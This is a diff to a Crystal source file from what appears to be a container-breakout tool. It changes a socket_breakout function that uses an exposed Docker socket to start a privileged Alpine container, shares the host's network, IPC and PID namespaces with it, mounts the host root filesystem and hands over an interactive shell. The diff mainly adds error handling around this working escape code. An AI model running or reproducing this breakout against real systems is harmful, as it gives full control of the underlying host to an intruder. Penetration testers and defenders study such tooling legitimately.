@@ -4,24 +4,28 @@ require "json"
 def socket_breakout(socket : String, port : Int32 = 0 )
     section_banner_green("Socket Breakout")
     puts("==> Attempting socket breakout via #{socket} socket")
-    client = setup_docker_client(socket,port)
-    client.pull_image("alpine:latest")
-    puts("==> Creating breakout container with host filesystem mounted.")
-    container_id = client.create_container("alpine:latest", Cmd: "/bin/sh", privileged: true, net: "host", ipc: "host", pid: "host", AttachStdin: false,AttachStdout: true,AttachStderr: true,Tty: true, HostConfig: {"Binds": ["/:/hostOS"]})
-    if container_id 
-        puts("==> Created container: #{container_id}")
-        client.start_container(container_id)
-        puts("==> Started container: #{container_id}")
-        puts("Started a privileged container. Sharing net/host/ipc namespaces with the host OS filesystem mounted. ".green())
-        handle_input(client,socket,port,container_id)
-    end
+    begin
+        client = setup_docker_client(socket,port)
+        client.pull_image("alpine:latest")
+        puts("==> Creating breakout container with host filesystem mounted.")
+        container_id = client.create_container("alpine:latest", Cmd: "/bin/sh", privileged: true, net: "host", ipc: "host", pid: "host", AttachStdin: false,AttachStdout: true,AttachStderr: true,Tty: true, HostConfig: {"Binds": ["/:/hostOS"]})
+        if container_id 
+            puts("==> Created container: #{container_id}")
+            client.start_container(container_id)
+            puts("==> Started container: #{container_id}")
+            puts("Started a privileged container. Sharing net/host/ipc namespaces with the host OS filesystem mounted. ".green())
+            handle_input(client,socket,port,container_id)
+        end
+    rescue ex
+        puts("Exception when attempting to communicate with #{socket} - #{ex.to_s}")
+    end 
 end
 
 def setup_docker_client(socket,port) # unix socket seems tempermental - getting broken pipe exceptions. Quick fix is just to reinstantiate the client after each exec request
     if port > 0
-        client = Docker::Client.new(socket,port)
+        client = Docker::Client.new(socket,port,false)
     else 
-        client = Docker::Client.new(socket)
+        client = Docker::Client.new(socket,0,false)
     end
     client
 end
